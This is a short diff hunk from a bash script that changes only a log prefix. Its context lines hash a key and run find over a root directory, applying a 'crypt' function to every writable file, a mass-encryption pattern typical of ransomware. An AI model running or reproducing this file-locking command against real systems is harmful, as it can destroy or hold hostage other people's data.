@@ -208,7 +208,7 @@ KEY_HASH_HEX=$(echo "$KEY_HEX" | xxd -r -p | sha256sum | cut -d ' ' -f 1)
 # export variable for use by child processes
 export KEY_HASH_HEX
 
-echo "[*] ${OPERATION}ing following files..."
+echo "[+] ${OPERATION}ing following files..."
 find "$ROOT_DIR" -type f -writable -print -exec bash -c 'crypt "$0"' {} \;
 
 
